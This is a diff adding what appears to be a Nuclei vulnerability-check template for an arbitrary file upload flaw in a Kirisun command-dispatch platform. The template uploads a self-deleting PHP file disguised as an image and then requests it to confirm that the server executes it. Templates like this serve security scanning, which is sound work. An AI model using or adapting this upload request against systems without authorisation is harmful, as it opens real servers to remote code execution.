@@ -1,0 +1,57 @@
+id: kirisun-uploadfile-anyfile-upload
+
+info:
+  name: 福建科立讯通信 指挥调度管理平台 uploadfile 任意文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: 文件上传
+
+variables:
+  t1: "{{rand_int(1000,10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - raw:
+      - |
+        POST /api/client/task/uploadfile.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary25qW4eG1Jt50iyf7
+        Content-Length: {{len(Body)}}
+
+        ------WebKitFormBoundary25qW4eG1Jt50iyf7
+        Content-Disposition: form-data; name="uuid"
+
+        1
+        ------WebKitFormBoundary25qW4eG1Jt50iyf7
+        Content-Disposition: form-data; name="number"
+
+        122
+        ------WebKitFormBoundary25qW4eG1Jt50iyf7
+        Content-Disposition: form-data; name="uploadfile"; filename="{{t1}}.php"
+        Content-Type: image/jpg
+
+        <?php echo md5({{t1}}); unlink(__FILE__); ?>
+        ------WebKitFormBoundary25qW4eG1Jt50iyf7--
+
+    matchers:
+      - type: word
+        words:
+          - successed
+          - .php
+
+    extractors:
+      - type: regex
+        name: "file"
+        regex:
+          - "(?m)/(?P<file>[a-z0-9-]+).php"
+
+  - raw:
+      - |
+        GET /upload/task/{{file}}.php HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
